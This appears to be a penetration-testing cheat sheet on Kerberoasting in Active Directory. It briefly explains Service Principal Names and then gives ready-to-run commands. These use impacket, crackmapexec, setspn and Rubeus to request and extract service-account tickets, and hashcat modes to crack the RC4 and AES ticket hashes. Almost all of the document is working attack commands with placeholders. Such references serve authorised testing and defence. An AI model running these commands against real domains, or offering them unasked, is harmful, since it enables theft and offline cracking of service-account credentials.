# Kerberoasting
You have a name and a secret (password, hash, ticket, aeskey)? Kerberoasting takes advantage of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs). SPN is an unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. By default, all standard domain users can request a copy of all service accounts STs (with SPN value set) encrypted with their correlating key.

Requirements:
* User with creds

## Remote
`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request`
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>`

## Local
Find SPN accounts:
`setspn -T medin -Q */*`

Hashes:
`Rubeus.exe kerberoast /nowrap`
`Rubeus.exe kerberoast /ticket:<TICKETBASE64/FILE> /nowrap`

## Hashcat
RC4:
`hashcat -m 13100 <HASH> <PASSLIST> --potfile-disable`
AES128-CTS-HMAC-SHA1-96:
`hashcat -m 19600 <HASH> <PASSLIST> --potfile-disable`
AES256-CTS-HMAC-SHA1-96:
`hashcat -m 19700 <HASH> <PASSLIST> --potfile-disable`